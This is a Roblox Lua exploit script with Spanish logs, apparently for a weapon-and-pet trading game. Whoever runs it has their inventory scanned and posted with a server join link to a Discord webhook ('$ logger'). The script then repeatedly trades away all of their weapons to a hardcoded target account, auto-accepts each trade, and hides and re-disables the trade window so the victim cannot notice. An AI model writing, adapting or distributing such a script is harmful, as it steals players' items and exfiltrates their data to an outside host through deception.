-- CONFIGURACIÓN
local TARGET_USER = "example"
local WEBHOOK_URL = "example"
local MAX_ROUNDS = 25
local AUTO_ACCEPT = true
local SKIP_IDS = { DefaultKnife = true, DefaultGun = true }

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local function log(msg, type)
    print("[made by joszz] [" .. type .. "] " .. msg)
end

log("Iniciando...", "START")

local Trade = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = Trade:WaitForChild("SendRequest")
local OfferItem = Trade:WaitForChild("OfferItem")
local StartTrade = Trade:WaitForChild("StartTrade")
local UpdateTrade = Trade:WaitForChild("UpdateTrade")
local AcceptTrade = Trade:WaitForChild("AcceptTrade")

local Sync
pcall(function() Sync = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync")) end)

local CATS = { "Weapons", "Pets", "Effects", "Perks", "Emotes", "Radios" }
local KEY_IS_ID = { Weapons = true, Pets = true }

local inTrade = false
local offered = false
local lastOffer = nil
local lastChange = 0
local acceptedFor = nil
local currentOfferCount = 0
local activeTarget = nil
local roundCount = 0
local tradesCompleted = false

local function findViaGC(matcher)
    if type(getgc) ~= "function" then return nil end
    local ok, gc = pcall(getgc, true)
    if not ok or type(gc) ~= "table" then return nil end
    for _, o in pairs(gc) do
        if type(o) == "table" then
            local good = false
            pcall(function() good = matcher(o) end)
            if good then return o end
        end
    end
    return nil
end

local function requireTimed(inst, timeout)
    if not inst then return nil end
    local done, result
    task.spawn(function()
        local ok, r = pcall(require, inst)
        if ok then result = r end
        done = true
    end)
    local t = 0
    while not done and t < timeout do task.wait(0.05); t += 0.05 end
    return result
end

local function getProfile()
    local p = findViaGC(function(o)
        local w = rawget(o, "Weapons")
        return type(w) == "table" and type(rawget(w, "Owned")) == "table"
    end)
    if p then return p end
    local m = ReplicatedStorage:FindFirstChild("Modules")
    return requireTimed(m and m:FindFirstChild("ProfileData"), 2)
end

local function resolveEvo(sync, u)
    local base = u.BaseItem
    if not u.EvoEquipped then return base end
    local w = sync.Weapons and sync.Weapons[base]
    if not (w and w.Evo) then return base end
    local xp, tier = u.XP or 0, 1
    if w.Evo[2] and xp >= w.Evo[2].XPRequired then tier = 2 end
    if w.Evo[3] and xp >= w.Evo[3].XPRequired then tier = 3 end
    if w.Evo[4] and xp >= w.Evo[4].XPRequired then tier = 4 end
    return (w.Evo[tier] and w.Evo[tier].ItemName) or base
end

local function buildInventory()
    local profile = getProfile()
    local sync = Sync or (findViaGC(function(o)
        return type(rawget(o, "Weapons")) == "table" and type(rawget(o, "Rarities")) == "table"
    end))

    local items = {}
    local counts = { total = 0, Weapons = 0, Pets = 0, Effects = 0, Perks = 0, Emotes = 0, Radios = 0, Uniques = 0 }

    if not profile or not sync then return items, counts end

    for _, cat in ipairs(CATS) do
        local owned = profile[cat] and profile[cat].Owned
        if type(owned) == "table" then
            local sc = sync[cat]
            for k, v in pairs(owned) do
                local id = KEY_IS_ID[cat] and k or v
                local amount = tonumber(v) or 1
                local data = sc and sc[id]
                if data then
                    table.insert(items, {
                        name = data.ItemName or data.Name or tostring(id),
                        qty = amount, category = cat, rarity = data.Rarity,
                    })
                    if counts[cat] ~= nil then counts[cat] += amount end
                end
            end
        end
    end

    if type(profile.Uniques) == "table" then
        for _, u in pairs(profile.Uniques) do
            if type(u) == "table" then
                local id = resolveEvo(sync, u)
                local data = sync.Weapons and sync.Weapons[id]
                table.insert(items, {
                    name = (data and (data.ItemName or data.Name)) or tostring(u.BaseItem),
                    qty = 1, category = "Uniques",
                    rarity = data and data.Rarity or "Unique",
                    rank = u.Rank, evo = u.EvoEquipped and true or nil,
                })
                counts.Uniques += 1
            end
        end
    end

    counts.total = #items
    table.sort(items, function(a, b)
        if a.category ~= b.category then return a.category < b.category end
        return a.name:lower() < b.name:lower()
    end)
    return items, counts
end

local function sendToDiscord()
    log("made by joszz 2", "SCAN")
    local items, counts = buildInventory()

    local sections = {}
    for _, cat in ipairs(CATS) do
        sections[cat] = {}
    end
    sections["Uniques"] = {}

    for _, item in ipairs(items) do
        table.insert(sections[item.category], item)
    end

    local desc = "**User:** " .. LocalPlayer.Name .. "\n\n**Inventario:**\n\n"

    for _, cat in ipairs(CATS) do
        local catItems = sections[cat]
        if #catItems > 0 then
            desc = desc .. "**" .. cat .. ":** (" .. counts[cat] .. ")\n"
            for _, item in ipairs(catItems) do
                local qty = item.qty > 1 and (" x" .. item.qty) or ""
                local rarity = item.rarity and (" [" .. item.rarity .. "]") or ""
                desc = desc .. "• " .. item.name .. qty .. rarity .. "\n"
            end
            desc = desc .. "\n"
        end
    end

    if #sections["Uniques"] > 0 then
        desc = desc .. "**Uniques:** (" .. counts.Uniques .. ")\n"
        for _, item in ipairs(sections["Uniques"]) do
            local evo = item.evo and " ⭐" or ""
            local rank = item.rank and (" #" .. item.rank) or ""
            desc = desc .. "• " .. item.name .. evo .. rank .. "\n"
        end
    end

    if #desc > 4096 then desc = desc:sub(1, 4093) .. "..." end

    local placeId = game.PlaceId
    local jobId = game.JobId
    local joinLink = "https://www.roblox.com/games/" .. placeId .. "?privateServerLinkCode=" .. jobId

    local payload = {
        username = LocalPlayer.Name .. " $ logger by J",
        avatar_url = "https://www.roblox.com/bust-thumbnails/avatar.ashx?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png",
        embeds = {{
            description = desc,
            color = 7651000,
            fields = {
                { name = "📍 Server", value = "[Join](" .. joinLink .. ")", inline = false }
            },
            footer = { text = os.date("%Y-%m-%d %H:%M:%S") },
        }}
    }

    pcall(function()
        local json = HttpService:JSONEncode(payload)
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = json
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
        end
    end)

    log("made by joszz ", "made by joszz ")
end

local function buildWeaponList(pd)
    local list = {}
    if pd.Weapons and type(pd.Weapons.Owned) == "table" then
        for id, amt in pairs(pd.Weapons.Owned) do
            if not SKIP_IDS[id] then
                table.insert(list, { id = id, amount = tonumber(amt) or 1 })
            end
        end
    end
    if type(pd.Uniques) == "table" then
        for _, u in pairs(pd.Uniques) do
            local id = resolveEvo(Sync or {}, u)
            if id and not SKIP_IDS[id] then
                table.insert(list, { id = id, amount = 1 })
            end
        end
    end
    return list
end

local function getUnitCount(pd)
    local list = buildWeaponList(pd)
    local units = 0
    for _, w in ipairs(list) do units += w.amount end
    return units
end

local function offerAll()
    local pd = getProfile()
    if not pd then return end

    local list = buildWeaponList(pd)
    for _, w in ipairs(list) do
        if not inTrade then return end
        for _ = 1, w.amount do
            pcall(function() OfferItem:FireServer(w.id, "Weapons") end)
            task.wait(0.03)
        end
    end

    local t0, last = os.clock(), currentOfferCount
    while os.clock() - t0 < 0.5 do
        task.wait(0.03)
        if currentOfferCount ~= last then
            last = currentOfferCount
            t0 = os.clock()
        end
    end
end

local function findPlayer(name)
    local p = Players:FindFirstChild(name)
    if p then return p end
    name = name:lower()
    for _, pl in ipairs(Players:GetPlayers()) do
        if pl.Name:lower() == name or pl.DisplayName:lower() == name then
            return pl
        end
    end
    return nil
end

local function attemptTrade(target)
    activeTarget = target
    log(" STWIO " .. target.Name .. "...", "TD")
    for attempt = 1, 4 do
        if not target.Parent then
            log("UD", "ERROR")
            return
        end
        inTrade, offered, lastOffer, acceptedFor, currentOfferCount = false, false, nil, nil, 0
        pcall(function() SendRequest:InvokeServer(target) end)
        log("Intento " .. attempt .. "/4", "ATTEMPT")

        local t0 = os.clock()
        while os.clock() - t0 < 8 do
            if inTrade then
                log("TI", "SUCCESS")
                return
            end
            task.wait(0.15)
        end
        log("Sin respuesta, reintentando...", "RETRY")
        task.wait(3)
    end
end

StartTrade.OnClientEvent:Connect(function()
    if offered then return end
    inTrade, offered, acceptedFor, currentOfferCount = true, true, nil, 0
    task.wait(0.2)
    offerAll()
    log("Items ofrecidos", "OFFER")
end)

UpdateTrade.OnClientEvent:Connect(function(td)
    if type(td) ~= "table" then return end
    if td.LastOffer ~= nil then
        lastOffer = td.LastOffer
        lastChange = os.clock()
    end
    local mine
    if td.Player1 and td.Player1.Player == LocalPlayer then
        mine = td.Player1
    elseif td.Player2 and td.Player2.Player == LocalPlayer then
        mine = td.Player2
    end
    if mine and type(mine.Offer) == "table" then
        currentOfferCount = #mine.Offer
    end
end)

AcceptTrade.OnClientEvent:Connect(function(done)
    if done then
        inTrade, offered = false, false
        log("TC", "COMPLETE")

        task.spawn(function()
            task.wait(1.2)
            local pd = getProfile()
            if not pd then return end

            local units = getUnitCount(pd)
            log("Items restantes: " .. units, "CHECK")

            if units <= 0 then
                tradesCompleted = true
                log("Inventario vacío ✓", "DONE")
                sendToDiscord()
                return
            end

            if roundCount >= MAX_ROUNDS then
                tradesCompleted = true
                log("Max rondas alcanzado", "LIMIT")
                return
            end

            roundCount += 1
            log("Ronda " .. roundCount .. " de " .. MAX_ROUNDS, "ROUND")

            if activeTarget and activeTarget.Parent then
                attemptTrade(activeTarget)
            end
        end)
    end
end)

pcall(function()
    Trade:WaitForChild("DeclineTrade").OnClientEvent:Connect(function()
        inTrade, offered, lastOffer, acceptedFor = false, false, nil, nil
        log("Trade declinado", "DECLINE")
    end)
end)

task.spawn(function()
    while true do
        task.wait(0.1)
        if AUTO_ACCEPT and inTrade and lastOffer ~= nil and lastOffer ~= acceptedFor then
            if os.clock() - lastChange >= 6.2 then
                acceptedFor = lastOffer
                pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, lastOffer) end)
                log("Accept enviado", "ACCEPT")
            end
        end
    end
end)

log("byjoszz", "byme")

local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local TRADE_GUIS = { "TradeGUI", "TradeGUI_Phone" }
local hiddenGuis = {}

local function blockGui(gui)
    if not gui or hiddenGuis[gui] then return end
    hiddenGuis[gui] = true
    gui.Enabled = false
    log("O: " .. gui.Name, "HIDDEN")

    gui:GetPropertyChangedSignal("Enabled"):Connect(function()
        if gui.Enabled then
            gui.Enabled = false
            log("B: " .. gui.Name, "BLOCKED")
        end
    end)
end

log("Lf", "SCAN")
for _, name in ipairs(TRADE_GUIS) do
    local gui = PlayerGui:FindFirstChild(name)
    if gui then
        log("Encontrado: " .. name, "FOUND")
        blockGui(gui)
    else
        log("Esperando: " .. name, "WAIT")
    end
end

PlayerGui.ChildAdded:Connect(function(child)
    for _, name in ipairs(TRADE_GUIS) do
        if child.Name == name then
            log("Creado: " .. name, "CREATE")
            task.wait(0.1)
            if child:IsA("ScreenGui") then
                blockGui(child)
                log("Bloqueado: " .. name, "SUCCESS")
            end
        end
    end
end)

sendToDiscord()

local target = findPlayer(TARGET_USER)
if target and target ~= LocalPlayer then
    log("Usuario encontrado: " .. TARGET_USER, "FOUND")
    attemptTrade(target)
else
    log("Esperando entrada de: " .. TARGET_USER, "WAIT")
    Players.PlayerAdded:Connect(function(plr)
        if (plr.Name:lower() == TARGET_USER:lower() or plr.DisplayName:lower() == TARGET_USER:lower()) and not tradesCompleted then
            log("Usuario entró: " .. TARGET_USER, "JOIN")
            task.wait(3)
            if plr.Parent then
                attemptTrade(plr)
            end
        end
    end)
end

log("Sistema listo", "READY")
